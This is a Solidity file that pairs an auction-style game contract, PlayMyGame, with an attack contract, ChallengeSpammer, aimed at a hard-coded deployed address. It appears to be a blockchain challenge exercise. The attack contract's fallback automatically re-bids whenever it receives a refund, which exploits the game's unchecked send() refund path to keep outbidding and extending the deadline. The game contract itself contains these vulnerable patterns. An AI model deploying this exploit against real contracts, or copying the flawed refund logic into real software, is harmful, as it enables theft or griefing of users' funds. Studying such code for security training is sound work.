//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./PlayMyGame.sol";

contract ChallengeSpammer {
  string public purpose = "Building Unstoppable Apps!!!";
  PlayMyGame target;

  constructor() {
    target = PlayMyGame(address(0x6e8FB9F79326f48b5b69881c31DDaDa3DEce7C1c));
  }

  function attack() external payable {
    target.bid{value: msg.value}();
  }

  fallback() external payable {
    target.bid{value: msg.value + 2000000000000001}();
  }
}

contract PlayMyGame {
    struct Bid {
        address payable who;
        uint256 amount;
    }

    address payable public beneficiary;
    uint256 public end;
    uint256 public prize;
    bool public claimed;
    Bid public first;
    Bid public second;

    constructor(uint256 duration) payable {
        prize = msg.value;
        end = block.timestamp + duration;
        beneficiary = payable(msg.sender);
    }

    function bid() external payable {
        require(block.timestamp < end);
        require(msg.value > first.amount + 1000000000000000);
        if (end - block.timestamp < 600) { end += 600; }
        second.who.send(second.amount);
        second = first;
        first = Bid(payable(msg.sender), msg.value);
    }

    function claim() external {
        require(claimed == false);
        require(block.timestamp > end);
        require(msg.sender == first.who);
        claimed = true;
        payable(msg.sender).send(prize + first.amount);
    }

    function clean() external {
        require(claimed == true);
        require(msg.sender == beneficiary);
        beneficiary.transfer(address(this).balance);
    }
}